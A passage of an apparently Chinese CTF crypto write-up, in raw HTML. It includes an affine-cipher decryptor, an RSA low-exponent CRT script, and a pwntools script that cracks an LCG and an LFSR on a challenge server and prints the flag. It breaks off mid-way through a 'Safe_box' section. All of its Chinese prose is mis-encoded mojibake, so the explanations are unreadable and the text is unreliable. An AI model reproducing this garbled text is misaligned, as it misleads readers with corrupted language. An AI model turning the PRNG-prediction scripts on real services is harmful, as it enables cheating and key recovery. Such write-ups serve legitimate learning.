class="string">"r"</span>)</span><br><span class="line"></span><br><span class="line">key = str(random.getrandbits(<span class="number">32</span>))</span><br><span class="line">key = <span class="string">'2990136190'</span></span><br><span class="line">ciphertext = decryption(flag, key)</span><br><span class="line"><span class="keyword">print</span> ciphertext</span><br></pre></td></tr></table></figure><h1 id="æœ±é›€ç»„"><a href="#æœ±é›€ç»„" class="headerlink" title="æœ±é›€ç»„"></a>æœ±é›€ç»„</h1><h2 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h2><p>ç®€å•ä»¿å°„åŠ å¯†ï¼Œå°±æ˜¯123456å’Œ26ä¸äº’ç´ ï¼Œæˆ‘ä»¬ç”¨26çš„ä¸€ä¸ªç´ å› å­13ä»£æ›¿26å…ˆï¼Œå¾—åˆ°çš„ç­”æ¡ˆï¼Œå¯ä»¥é€‰æ‹©ï¼šå¦‚æœä¸ç¬¦åˆuuidæ ¼å¼ï¼Œå°±åŠ ä¸ª13ï¼Œä¸è¿‡ï¼Œåæ¥æƒ³æƒ³ï¼Œç”±äºuuidåªæœ‰abcdefåŠ ä¸Š â€˜flagâ€™ çš„lgï¼Œæ¨¡13å…¶å®æ˜¯è¶³å¤Ÿçš„ã€‚æ‰€ä»¥å…¶å®ä¸éœ€è¦åˆ¤æ–­ã€‚</p><p>ç”±äºä»¿å°„ä¸åŠ å¯†é™¤å­—æ¯å¤–çš„å­—ç¬¦ï¼Œæ‰€ä»¥ç›´æ¥æ‹¼æ¥ä¸Šæ¥å°±å¯ä»¥äº†</p><p>ç¡®å®simpleï¼Œè§£å¯†ä»£ç å°±ä¸€è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line">flag = <span class="string">''</span>.join(i <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"qwertyuiopasdfghjklzxcvbnm"</span> <span class="keyword">else</span> chr(((ord(i)-ord(<span class="string">'a'</span>) - <span class="number">321564</span>))*inverse(<span class="number">123456</span>,<span class="number">13</span>)%<span class="number">13</span>+ord(<span class="string">'a'</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'kgws&#123;m8u8cm65-ue9k-44k5-8361-we225m76eeww&#125;'</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="RUA"><a href="#RUA" class="headerlink" title="RUA"></a>RUA</h2><p>rsaä½åŠ å¯†æŒ‡æ•°æ”»å‡»ï¼Œç›´æ¥å¥—<a href="https://xz.aliyun.com/t/6459#toc-37" target="_blank" rel="noopener">å…ˆçŸ¥</a>ä¸Šçš„ä¸€ä¸ªè„šæœ¬ï¼Œåˆšå¼€å§‹æµ‹e=3ï¼Œå‘ç°å¤±è´¥ï¼Œäºæ˜¯çˆ†ç ´e</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii,gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(reduce(gmpy2.gcd,mi)==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m=gmpy2.iroot(CRT([n1,n2,n3], [c1,c2,c3]), e)[<span class="number">0</span>]</span><br><span class="line">        print(binascii.unhexlify(hex(m)[<span class="number">2</span>:].strip(<span class="string">"L"</span>)))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="guess-game"><a href="#guess-game" class="headerlink" title="guess_game"></a>guess_game</h2><p>ä¸¤ä¸ªè€ƒç‚¹ï¼šLCGå’ŒLFSR</p><p>LCGæ”»å‡»åŸç†<a href="https://www.codercto.com/a/35743.html" target="_blank" rel="noopener">è¿™é‡Œ</a>çœ‹ï¼ŒNCTFå‡ºç°è¿‡çš„ã€‚</p><p>LFSRçš„æ”»å‡»æ‰‹æ³•<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/lfsr-zh/" target="_blank" rel="noopener">ctf-wiki</a>ä¸Šçœ‹ã€‚</p><p>è§£å¯†æµç¨‹ï¼š</p><p>ç¬¬ä¸€æ­¥æˆ‘ä»¬é€šè¿‡å…­ä¸ªlevelçš„å€¼æ¢å¤LCGçš„å‚æ•°ä»è€Œé¢„æµ‹ç¬¬ä¸ƒä¸ªcodeï¼Œä»è€Œè¾¾åˆ°(500,10)è¿™ä¸ªlevelã€‚<del>å¼€å±€æ‹¥æœ‰10ä¸ªcoinï¼</del></p><p>ç„¶åæˆ‘ä»¬ç”¨9æ¬¡æœºä¼šï¼Œå¯ä»¥å¾—åˆ°72bitçš„è¾“å‡ºï¼Œå…¶ä¸­å‰40bitè¾“å‡ºé€†åºå¯ä»¥å¾—åˆ°åˆå§‹çš„r</p><p>ä½†æ˜¯è¿™é‡Œçš„lfsrå…¶å®æ˜¯39çº§çš„ï¼Œæ‰€ä»¥è‡³å°‘éœ€è¦78bitæ‰èƒ½æ¢å¤</p><p>æ‰€ä»¥æˆ‘ä»¬è¦çˆ†ç ´6bitçš„è¾“å‡º</p><p>éœ€è¦è¯´æ˜çš„æ˜¯å³ä½¿æœ‰78bitçš„è¾“å‡ºï¼Œä¹Ÿæœ‰å¯èƒ½å› ä¸ºçŸ©é˜µæ²¡æœ‰æ»¡ç§©ä»è€Œè§£ä¸å‡ºkeyæ¥ã€‚</p><p>ç„¶åè¿™é‡Œæˆ‘æ¢äº†ä¸ªæ€è·¯ï¼Œæˆ‘ç¡¬çŒœï¼Œè¦æ±‚å‰ä¹æ¬¡çŒœä¸­ä¸€ä¸ªï¼Œè¿™æ ·æˆ‘å°±å¯ä»¥å¤šæ‹¿ä¸¤ç»„æ•°æ®ï¼ˆå…¶å®å¤šæ‹¿ä¸€æ¬¡å°±å¤Ÿäº†ï¼‰</p><p>è¿™æ ·æˆ‘å°±èƒ½æ‹¿åˆ°80bitçš„è¾“å‡ºï¼Œç„¶åæˆ‘ç”¨ä¸‹é¢é‚£ä¸ªsageè„šæœ¬ï¼Œæ ¹æ®wikiæ‰€è¿°æ„é€ çŸ©é˜µï¼Œè§£ä¸ªçº¿æ€§æ–¹ç¨‹ï¼Œå¾—åˆ°keyã€‚<del>ç‚¹è§£å¯†çš„æ—¶å€™è¦æ”¾ã€Šå¥½è¿æ¥ã€‹ï¼Œå¢åŠ è§£å¯†æˆåŠŸçš„æ¦‚ç‡ï¼Œå”±ã€Šå›½æ­Œã€‹åº”è¯¥ä¹Ÿå¯ä»¥ã€‚</del></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">output = &apos;10100010010100010010101001100110000000000111101111011101010101000111110011111011&apos;</span><br><span class="line"></span><br><span class="line">N = 39</span><br><span class="line">F = GF(2)</span><br><span class="line">ans=[]</span><br><span class="line">out = output</span><br><span class="line">Sn = [vector(F,N) for j in range(N+1)]</span><br><span class="line">for j in range(N+1):</span><br><span class="line">    Sn[j] = list(map(int,out[j:j+N]))</span><br><span class="line">    </span><br><span class="line">X = matrix(F,Sn[:N])</span><br><span class="line">invX = (X^-1)</span><br><span class="line">Y = vector(F,Sn[-1])</span><br><span class="line">Cn = Y * invX</span><br><span class="line">res = &apos;&apos;.join(str(i) for i in Cn)</span><br><span class="line">ans.append(int(res[::-1],2))</span><br><span class="line">print (ans)</span><br><span class="line">print(len(ans))</span><br><span class="line"></span><br><span class="line">&gt;&gt; [71834525659]</span><br><span class="line">&gt;&gt; 1</span><br></pre></td></tr></table></figure><p>ç”¨äºäº¤äº’çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_increment</span><span class="params">(states, modulus, multiplier)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    åˆ©ç”¨ä¼ªéšæœºåºåˆ—s,æ¨¡æ•°n,ä¹˜æ•°mï¼Œæ¢å¤å¢æ•°c</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    states:ä¼ªéšæœºæ•°åºåˆ—s</span></span><br><span class="line"><span class="string">    modulus:æ¨¡æ•°nï¼Œ</span></span><br><span class="line"><span class="string">    multiplier:ä¹˜æ•°m</span></span><br><span class="line"><span class="string">    incrementï¼šå¢é‡c</span></span><br><span class="line"><span class="string">    return:æ ¹æ®n,m,s0,s1æ¢å¤cï¼Œå¹¶è¿”å›</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_multiplier</span><span class="params">(states, modulus)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    åˆ©ç”¨ä¼ªéšæœºåºåˆ—så’Œæ¨¡æ•°nï¼Œæ¢å¤ä¹˜æ•°m</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    states:ä¼ªéšæœºæ•°åºåˆ—s</span></span><br><span class="line"><span class="string">    modulus:æ¨¡æ•°nï¼Œ</span></span><br><span class="line"><span class="string">    multiplier:ä¹˜æ•°m</span></span><br><span class="line"><span class="string">    return:æ ¹æ®n,s0,s1,s2æ¢å¤mï¼Œç„¶ååˆ©ç”¨crack_unknown_incrementæ¢å¤c</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * inverse(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_modulus</span><span class="params">(states)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    åˆ©ç”¨åˆå€¼å’ŒéšåLCGäº§ç”Ÿçš„è¿ç»­çš„å‡ ä¸ªå€¼,æ¢å¤æ¨¡æ•°n</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    modulus:æ¨¡æ•°n</span></span><br><span class="line"><span class="string">    states:ä¼ªéšæœºæ•°åºåˆ—s</span></span><br><span class="line"><span class="string">    diffs:ç›¸é‚»éšæœºæ•°sçš„å·®å€¼ï¼štåºåˆ—</span></span><br><span class="line"><span class="string">              zeroes:ä¸tç³»åˆ—æœ‰å…³çš„å·®å€¼ï¼Œzeroes = t2*t0 - t1*t1,t0,t1,t2ç›¸é‚»</span></span><br><span class="line"><span class="string">    return:æ ¹æ®n,s0,s1,s2æ¢å¤mï¼Œç„¶ååˆ©ç”¨crack_unknown_incrementæ¢å¤c</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> zip(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> zip(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = abs(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcg</span><span class="params">(seed,params)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    LCGç®—æ³•</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    params:(multiplier,increment,modulus)</span></span><br><span class="line"><span class="string">    seed:ä¼ªéšæœºåºåˆ—ä¸­ç¬¬ä¸€ä¸ªå€¼s0</span></span><br><span class="line"><span class="string">    returnï¼šè¿”å›ä¸€ä¸ªè¿­ä»£å™¨ï¼Œå…¶ä¸­çš„å€¼æ˜¯ç§é’¥åºåˆ—</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    (m,c,n)=params</span><br><span class="line">    x = seed % n</span><br><span class="line">    <span class="keyword">yield</span> int(x)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = (m * x + c) % n</span><br><span class="line">        <span class="keyword">yield</span> int(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(pri,pub,c,p)</span>:</span>    </span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ElGamalè§£å¯†ç®—æ³•</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    pri:ä¸€æ–¹ç§é’¥</span></span><br><span class="line"><span class="string">    pub:å¦ä¸€æ–¹å…¬é’¥</span></span><br><span class="line"><span class="string">    sharekey:åŒæ–¹åå•†å¯†é’¥</span></span><br><span class="line"><span class="string">    c:å¯†æ–‡</span></span><br><span class="line"><span class="string">    p:æ¨¡æ•°</span></span><br><span class="line"><span class="string">    m:æ˜æ–‡</span></span><br><span class="line"><span class="string">    return:è¿”å›æ˜æ–‡å­—ç¬¦</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    sharekey = pow(pub,pri,p)</span><br><span class="line">    m=long_to_bytes(c*inverse(sharekey,p)%p)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, n, key, r, b)</span>:</span></span><br><span class="line">        self.n = n<span class="comment">#40</span></span><br><span class="line">        self.key = key </span><br><span class="line">        self.r = r &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        self.b = b<span class="comment">#8</span></span><br><span class="line">                 </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">out</span><span class="params">(self)</span>:</span></span><br><span class="line">        o = self.r &amp; <span class="number">1</span></span><br><span class="line">        p = self.r &amp; self.key</span><br><span class="line">        q = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> p:</span><br><span class="line">            q = q + p &amp; <span class="number">1</span></span><br><span class="line">            p = p &gt;&gt; <span class="number">1</span></span><br><span class="line">        q = q &amp; <span class="number">1</span></span><br><span class="line">        t = q &lt;&lt; (self.n - <span class="number">2</span>) &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        self.r = t | (self.r &gt;&gt; <span class="number">1</span>) &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> o</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.b):</span><br><span class="line">            o = self.out()</span><br><span class="line">            res |=  o &lt;&lt; (self.b - <span class="number">1</span> - i)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getr</span><span class="params">(s)</span>:</span></span><br><span class="line">    r = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        b = bin(i)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> b:</span><br><span class="line">            r = each+r</span><br><span class="line">    <span class="keyword">print</span> int(r,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> int(r,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getk</span><span class="params">(s)</span>:</span></span><br><span class="line">    k=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        b = bin(i)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> b:</span><br><span class="line">            k += each</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line">        </span><br><span class="line">sh = remote(<span class="string">'59.110.243.101'</span>,<span class="string">'5123'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Your choice:\n"</span>)</span><br><span class="line">sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Baby:"</span>)</span><br><span class="line">Baby = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Easy:"</span>)</span><br><span class="line">Easy = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Normal:"</span>)</span><br><span class="line">Normal = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Hard:"</span>)</span><br><span class="line">Hard = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Master:"</span>)</span><br><span class="line">Master = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Crazy:"</span>)</span><br><span class="line">Crazy = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">pri=[Baby,Easy,Normal,Hard,Master,Crazy]</span><br><span class="line"></span><br><span class="line">(n,m,c)=crack_unknown_modulus([int(each) <span class="keyword">for</span> each <span class="keyword">in</span> pri])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=int(pri[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">key = lcg(x,(m,c,n))</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    next(key)</span><br><span class="line">choice = next(key)</span><br><span class="line">sh.recvuntil(<span class="string">"Input the level code:\n"</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(str(choice))</span><br><span class="line">sh.recvuntil(<span class="string">"Your choice:\n"</span>)</span><br><span class="line">sh.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">#flag=""</span></span><br><span class="line">s=[]</span><br><span class="line">F = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">"Input your answer:\n"</span>)</span><br><span class="line">    sh.sendline(<span class="string">"0"</span>)</span><br><span class="line">    ans = sh.recvuntil(<span class="string">"The answer is "</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Right'</span> <span class="keyword">in</span> ans:</span><br><span class="line">        F = <span class="number">1</span></span><br><span class="line">        print(<span class="string">"NICE"</span>)</span><br><span class="line">    s.append(int(sh.recvuntil(<span class="string">"!"</span>)[:<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> F == <span class="number">1</span>:</span><br><span class="line">    sh.recvuntil(<span class="string">"Input your answer:\n"</span>)</span><br><span class="line">    sh.sendline(<span class="string">"0"</span>)</span><br><span class="line">    ans = sh.recvuntil(<span class="string">"The answer is "</span>)</span><br><span class="line">    s.append(int(sh.recvuntil(<span class="string">"!"</span>)[:<span class="number">-1</span>]))</span><br><span class="line">    </span><br><span class="line">r = getr(s[:<span class="number">5</span>])</span><br><span class="line">output = getk(s[:])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"r:"</span>+str(r)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"output:"</span>+ output</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">k = input(<span class="string">"k:"</span>)</span><br><span class="line">game = Game(<span class="number">40</span>,k,r,<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    next(game)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">"Input your answer:\n"</span>)</span><br><span class="line">    sh.sendline(str(next(game)))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[DEBUG] Received <span class="number">0x3f</span> bytes:</span><br><span class="line">    <span class="string">'Your coin: 500\n'</span></span><br><span class="line">    <span class="string">'You Win!\n'</span></span><br><span class="line">    <span class="string">'flag&#123;12727f129b72e685388c6a67538ee9b0&#125;\n'</span></span><br></pre></td></tr></table></figure><p>æœ€åäº”åˆ†é’Ÿå‡ºflagï¼Œå¤ªå¹¸è¿äº†ã€‚<del>å°±æ˜¯æ²¡é˜Ÿä¼ï¼Œæœ‰ç‚¹æµªè´¹äº†</del>ã€‚</p><h1 id="ç„æ­¦ç»„"><a href="#ç„æ­¦ç»„" class="headerlink" title="ç„æ­¦ç»„"></a>ç„æ­¦ç»„</h1><h2 id="Safe-box"><a href="#Safe-box" class="headerlink" title="Safe_box"></a>Safe_box</h2><p>ä¸»è¦é€»è¾‘</p><ol><li>è¿‡äº†PoWè¿›è¡Œäº¤äº’</li><li>1å¯ä»¥å¾—åˆ°ä¸€ç»„23*20çš„key</li><li>3å¯ä»¥å¾—åˆ°flagçš„å¯†æ–‡c</li><li>åŠ å¯†å‡½æ•°ç”Ÿæˆ23*40çš„keyï¼Œä¸€å…±23ç»„æ˜æ–‡ï¼Œæ¯ç»„æ˜æ–‡åŠ å¯†40æ¬¡ï¼Œè®°å½•æ¯æ¬¡çš„ç»“æœ</li><li>æ¯ä¸€æ¬¡çš„åŠ å¯†é€»è¾‘ä¸ºb = m + Î£((a_j*<em>i)</em>e_i)ï¼Œå…¶ä¸­a_jä¸ºç»„é‡Œçš„åŠ å¯†æ¬¡æ•°ï¼Œj=1ï¼Œ2ï¼Œï¼Œ40ï¼›e_iä¸ºåˆ—è¡¨eé‡Œçš„æ¯ä¸€ä¸ªå…ƒç´ ï¼Œi = 1ï¼Œ2ï¼Œ3ï¼Œï¼Œ,29</li></ol><p>è§£å¯†æµç¨‹</p><ol><li>ç¬¬ä¸€ç»„ï¼Œå½“i=0æ—¶ï¼Œa=1ï¼Œb_1 = m_1 + Î£(e_i)</li><li>ç¬¬äºŒç»„ï¼Œå½“i=0æ—¶ï¼Œa=1ï¼Œb_2 = m_2 + Î£(e_i)</li><li>ç¬¬ä¸‰ç»„ï¼Œå½“i=0æ—¶ï¼Œa=1ï¼Œb_3 = m_3 + Î£(e_i)</li><li>æˆ‘ä»¬å¾—åˆ°çš„23ç»„ä¿¡æ¯ä¸­çš„æ¯ç»„çš„ç¬¬ä¸€æ¡å°±æ˜¯b_1, 